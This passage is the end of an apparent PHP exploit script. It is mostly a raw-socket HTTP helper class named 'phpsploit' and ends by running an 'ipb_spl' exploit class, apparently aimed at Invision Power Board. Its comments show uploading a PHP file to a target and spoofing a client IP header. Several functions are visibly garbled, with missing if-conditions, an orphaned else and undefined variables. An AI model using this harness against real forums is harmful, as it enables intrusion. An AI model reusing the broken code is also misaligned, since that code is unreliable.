		if(!empty($this->header))
		   $this->packet .= $this->showheader();
		   
		if(!empty($this->cookie))
		   $this->packet .= &#039;Cookie: &#039;.$this->showcookie()."\r\n";

		$this->packet .= &#039;Host: &#039;.$this->host."\r\n";
		$this->packet .= "Connection: Close\r\n";
		
		if($this->method==&#039;post&#039;)
		{
			$this->packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
			$this->packet .= &#039;Content-Length: &#039;.strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data."\r\n";
		}
		elseif($this->method==&#039;formdata&#039;)
		{
			$this->packet .= &#039;Content-Type: multipart/form-data; boundary=&#039;.str_repeat(&#039;-&#039;,27).$this->boundary."\r\n";
			$this->packet .= &#039;Content-Length: &#039;.strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data;
		}

		$this->packet .= "\r\n";
		$this->recv = &#039;&#039;;

		fputs($socket, $this->packet);

		while(!feof($socket))
		   $this->recv .= fgets($socket);

		fclose($socket);

		if($this->cookiejar)
		   $this->getcookie();

		if($this->allowredirection)
		   return $this->getredirection();
		else
		   return $this->recv;
	}
	

	/**
	 * This function allows you to add several
	 * cookies in the request.
	 * 
	 * @access  public
	 * @param   string cookn CookieName
	 * @param   string cookv CookieValue
	 * @example $this->addcookie(&#039;name&#039;,&#039;value&#039;)
	 * 
	 */
	function addcookie($cookn,$cookv)
	{
		if(!isset($this->cookie))
		   $this->cookie = array();

		$this->cookie[$cookn] = $cookv;
	}


	/**
	 * This function allows you to add several
	 * headers in the request.
	 *
	 * @access  public
	 * @param   string headern HeaderName
	 * @param   string headervalue Headervalue
	 * @example $this->addheader(&#039;Client-IP&#039;, &#039;128.5.2.3&#039;)
	 * 
	 */
	function addheader($headern,$headervalue)
	{
		if(!isset($this->header))
		   $this->header = array();
		   
		$this->header[$headern] = $headervalue;
	}
	
	/**
	 * This function allows you to use an
	 * http proxy server. Several methods
	 * are supported.
	 * 
	 * @access  public
	 * @param   string proxy ProxyHost
	 * @param   integer proxyp ProxyPort
	 * @example $this->proxy(&#039;localhost&#039;,8118)
	 * @example $this->proxy(&#039;localhost:8118&#039;)
	 * 
	 */
	function proxy($proxy,$proxyp=&#039;&#039;)
	{
		if(empty($proxyp))
		{
			$proxarr = explode(&#039;:&#039;,$proxy);
			$this->proxyhost = $proxarr[0];
			$this->proxyport = (int)$proxarr[1];
		}
		else 
		{
			$this->proxyhost = $proxy;
			$this->proxyport = (int)$proxyp;
		}

		if($this->proxyport > 65535)
		   die("Error: Invalid port number");
	}
	

	/**
	 * This function allows you to use an
	 * http proxy server which requires a
	 * basic authentification. Several
	 * methods are supported:
	 *
	 * @access  public
	 * @param   string proxyauth ProxyUser
	 * @param   string proxypass ProxyPass
	 * @example $this->proxyauth(&#039;user&#039;,&#039;pwd&#039;)
	 * @example $this->proxyauth(&#039;user:pwd&#039;);
	 * 
	 */
	function proxyauth($proxyauth,$proxypass=&#039;&#039;)
	{
		if(empty($proxypass))
		{
			$posvirg = strpos($proxyauth,&#039;:&#039;);
			$this->proxyuser = substr($proxyauth,0,$posvirg);
			$this->proxypass = substr($proxyauth,$posvirg+1);
		}
		else
		{
			$this->proxyuser = $proxyauth;
			$this->proxypass = $proxypass;
		}
	}


	/**
	 * This function allows you to set
	 * the &#039;User-Agent&#039; header.
	 * 
	 * @access  public
	 * @param   string useragent Agent
	 * @example $this->agent(&#039;Firefox&#039;)
	 * 
	 */
	function agent($useragent)
	{
		$this->addheader(&#039;User-Agent&#039;,$useragent);
	}

	
	/**
	 * This function returns the headers
	 * which will be in the next request.
	 * 
	 * @access  public
	 * @return  string $this->header_str Headers
	 * @return  array  $this->head Headers
	 * @example $this->showheader()
	 * @example $this->showheader(1)
	 * 
	 */
	function showheader($array=&#039;&#039;)
	{
		$this->header_str = &#039;&#039;;
		
		if(!isset($this->header))
		   return;
		   
		if(!empty($array))
			return $this->header;
			
		foreach($this->header as $name => $value)
		   $this->header_str .= $name.&#039;: &#039;.$value."\r\n";
		   
		return $this->header_str;
	}

	
	/**
	 * This function returns the cookies
	 * which will be in the next request.
	 * 
	 * @access  public
	 * @return  string $this->cookie_str Cookies
	 * @return  array  $this->cookie Cookies
	 * @example $this->showcookie()
	 * @example $this->showcookie(1)
	 * 
	 */
	function showcookie($array=&#039;&#039;)
	{
		if(!isset($this->cookie))
		   return;
		 
		if(!empty($array))
			return $this->cookie;
		
		$this->cookie_str = &#039;&#039;;
		
		foreach($this->cookie as $name => $value)
		   $this->cookie_str .= $name.&#039;=&#039;.$value.&#039;; &#039;;

		return $this->cookie_str;
	}


	/**
	 * This function returns the last
	 * formed http request.
	 * 
	 * @access  public
	 * @return  string $this->packet HttpPacket
	 * @example $this->showlastrequest()
	 * 
	 */
	function showlastrequest()
	{
		if(!isset($this->packet))
		   return;
		else
		   return $this->packet;
	}


	/**
	 * This function sends the formed
	 * http packet with the GET method.
	 * 
	 * @access  public
	 * @param   string url Url
	 * @return  string $this->sock()
	 * @example $this->get(&#039;localhost/index.php?var=x&#039;)
	 * @example $this->get(&#039;http://localhost:88/tst.php&#039;)
	 * 
	 */
	function get($url)
	{
		$this->target($url);
		$this->method = &#039;get&#039;;
		return $this->sock();
	}

	
	/**
	 * This function sends the formed
	 * http packet with the POST method.
	 *
	 * @access  public
	 * @param   string url  Url
	 * @param   string data PostData
	 * @return  string $this->sock()
	 * @example $this->post(&#039;http://localhost/&#039;,&#039;helo=x&#039;)
	 * 
	 */	
	function post($url,$data)
	{
		$this->target($url);
		$this->method = &#039;post&#039;;
		$this->data = $data;
		return $this->sock();
	}
	

	/**
	 * This function sends the formed http
	 * packet with the POST method using
	 * the multipart/form-data enctype.
	 * 
	 * @access  public
	 * @param   array array FormDataArray
	 * @return  string $this->sock()
	 * @example $formdata = array(
	 *                      frmdt_url => &#039;http://localhost/upload.php&#039;,
	 *                      frmdt_boundary => &#039;123456&#039;, # Optional
	 *                      &#039;var&#039; => &#039;example&#039;,
	 *                      &#039;file&#039; => array(
	 *                                frmdt_type => &#039;image/gif&#039;,  # Optional
	 *                                frmdt_transfert => &#039;binary&#039; # Optional
	 *                                frmdt_filename => &#039;hello.php,
	 *                                frmdt_content => &#039;<?php echo 1; ?>&#039;));
	 *          $this->formdata($formdata);
	 * 
	 */
	function formdata($array)
	{
		$this->target($array[frmdt_url]);
		$this->method = &#039;formdata&#039;;
		$this->data = &#039;&#039;;
		
		if(!isset($array[frmdt_boundary]))
		   $this->boundary = &#039;phpsploit&#039;;
		else
		   $this->boundary = $array[frmdt_boundary];

		foreach($array as $key => $value)
		{
			{
				$this->data .= str_repeat(&#039;-&#039;,29).$this->boundary."\r\n";
				$this->data .= &#039;Content-Disposition: form-data; name="&#039;.$key.&#039;";&#039;;
				
				if(!is_array($value))
				{
					$this->data .= "\r\n\r\n".$value."\r\n";
				}
				else
				{
					$this->data .= &#039; filename="&#039;.$array[$key][frmdt_filename]."\";\r\n";

					if(isset($array[$key][frmdt_type]))
					   $this->data .= &#039;Content-Type: &#039;.$array[$key][frmdt_type]."\r\n";

					if(isset($array[$key][frmdt_transfert]))
					   $this->data .= &#039;Content-Transfer-Encoding: &#039;.$array[$key][frmdt_transfert]."\r\n";

					$this->data .= "\r\n".$array[$key][frmdt_content]."\r\n";
				}
			}
		}

		$this->data .= str_repeat(&#039;-&#039;,29).$this->boundary."--\r\n";
		return $this->sock();
	}

	
	/**
	 * This function returns the content
	 * of the server response, without
	 * the headers.
	 * 
	 * @access  public
	 * @param   string code ServerResponse
	 * @return  string $this->server_content
	 * @example $this->getcontent()
	 * @example $this->getcontent($this->get(&#039;http://localhost/&#039;))
	 * 
	 */
	function getcontent($code=&#039;&#039;)
	{
		if(empty($code))
		   $code = $this->recv;

		$code = explode("\r\n\r\n",$code);
		$this->server_content = &#039;&#039;;
		
		for($i=1;$i<count($code);$i++)
		   $this->server_content .= $code[$i];

		return $this->server_content;
	}

	
	/**
	 * This function returns the headers
	 * of the server response, without
	 * the content.
	 * 
	 * @access  public
	 * @param   string code ServerResponse
	 * @return  string $this->server_header
	 * @example $this->getcontent()
	 * @example $this->getcontent($this->post(&#039;http://localhost/&#039;,&#039;1=2&#039;))
	 * 
	 */
	function getheader($code=&#039;&#039;)
	{
		if(empty($code))
		   $code = $this->recv;

		$code = explode("\r\n\r\n",$code);
		$this->server_header = $code[0];
		
		return $this->server_header;
	}

	
	/**
	 * This function is called by the
	 * cookiejar() function. It adds the
	 * value of the "Set-Cookie" header
	 * in the "Cookie" header for the
	 * next request. You don&#039;t have to
	 * call it.
	 * 
	 * @access private
	 * @param  string code ServerResponse
	 * 
	 */
	function getcookie()
	{
		foreach(explode("\r\n",$this->getheader()) as $header)
		{
			{
				$fequal = strpos($header,&#039;=&#039;);
				$fvirgu = strpos($header,&#039;;&#039;);
				
				// 12=strlen(&#039;set-cookie: &#039;)
				$cname  = substr($header,12,$fequal-12);
				$cvalu  = substr($header,$fequal+1,$fvirgu-(strlen($cname)+12+1));
				
				$this->cookie[trim($cname)] = trim($cvalu);
			}
		}
	}


	/**
	 * This function is called by the
	 * get()/post() functions. You
	 * don&#039;t have to call it.
	 *
	 * @access  private
	 * @param   string urltarg Url
	 * @example $this->target(&#039;http://localhost/&#039;)
	 * 
	 */
	function target($urltarg)
	{
		if(!ereg(&#039;^http://&#039;,$urltarg))
		   $urltarg = &#039;http://&#039;.$urltarg;
		
		$urlarr = parse_url($urltarg);
		
		if(!isset($urlarr[&#039;path&#039;]) || empty($urlarr[&#039;path&#039;]))
		
		$this->url  = $urlarr[&#039;path&#039;];
		
		if(isset($urlarr[&#039;query&#039;]))
		   $this->url .= &#039;?&#039;.$urlarr[&#039;query&#039;];
		
		$this->port = !empty($urlarr[&#039;port&#039;]) ? $urlarr[&#039;port&#039;] : 80;
		$this->host = $urlarr[&#039;host&#039;];
		
		if($this->port != &#039;80&#039;)
		   $this->host .= &#039;:&#039;.$this->port;

		$this->path = substr($urlarr[&#039;path&#039;],0,strrpos($urlarr[&#039;path&#039;],&#039;/&#039;)+1);
		
		if($this->port > 65535)
		   die("Error: Invalid port number");
	}
	
	
	/**
	 * If you call this function,
	 * the script will extract all
	 * &#039;Set-Cookie&#039; headers values
	 * and it will automatically add
	 * them into the &#039;Cookie&#039; header
	 * for all next requests.
	 *
	 * @access  public
	 * @param   integer code 1(enabled) 0(disabled)
	 * @example $this->cookiejar(0)
	 * @example $this->cookiejar(1)
	 * 
	 */
	function cookiejar($code)
	{
		if($code==&#039;0&#039;)
		   $this->cookiejar=FALSE;

		elseif($code==&#039;1&#039;)
		   $this->cookiejar=TRUE;
	}


	/**
	 * If you call this function,
	 * the script will follow all
	 * redirections sent by the server.
	 * 
	 * @access  public
	 * @param   integer code 1(enabled) 0(disabled)
	 * @example $this->allowredirection(0)
	 * @example $this->allowredirection(1)
	 * 
	 */
	function allowredirection($code)
	{
		if($code==&#039;0&#039;)
		   $this->allowredirection=FALSE;
		   
		elseif($code==&#039;1&#039;)
		   $this->allowredirection=TRUE;
	}

	
	/**
	 * This function is called if
	 * allowredirection() is enabled.
	 * You don&#039;t have to call it.
	 *
	 * @access private
	 * @return string $this->get(&#039;http://&#039;.$this->host.$this->path.$this->last_redirection)
	 * @return string $this->get($this->last_redirection)
	 * @return string $this->recv;
	 * 
	 */
	function getredirection()
	{
		{
			$this->last_redirection = trim($codearr[2]);
			
			if(!ereg(&#039;://&#039;,$this->last_redirection))
			   return $this->get(&#039;http://&#039;.$this->host.$this->path.$this->last_redirection);

			else
			   return $this->get($this->last_redirection);
		}
		else
		   return $this->recv;
	}


	/**
	 * This function allows you
	 * to reset some parameters.
	 * 
	 * @access  public
	 * @param   string func Param
	 * @example $this->reset(&#039;header&#039;)
	 * @example $this->reset(&#039;cookie&#039;)
	 * @example $this->reset()
	 * 
	 */
	function reset($func=&#039;&#039;)
	{
		switch($func)
		{
			case &#039;header&#039;:
			$this->header = array();
			break;
				
			case &#039;cookie&#039;:
			$this->cookie = array();
			break;
				
			default:
			$this->cookiejar = &#039;&#039;;
			$this->header = array();
			$this->cookie = array();
			$this->allowredirection = &#039;&#039;;
			break;
		}
	}
}

$web = new phpsploit;
$web->cookiejar(1);
$web->agent(&#039;Mozilla Firefox&#039;);

$ipb = new ipb_spl;
$ipb->web =& $web;
$ipb->main();

?>



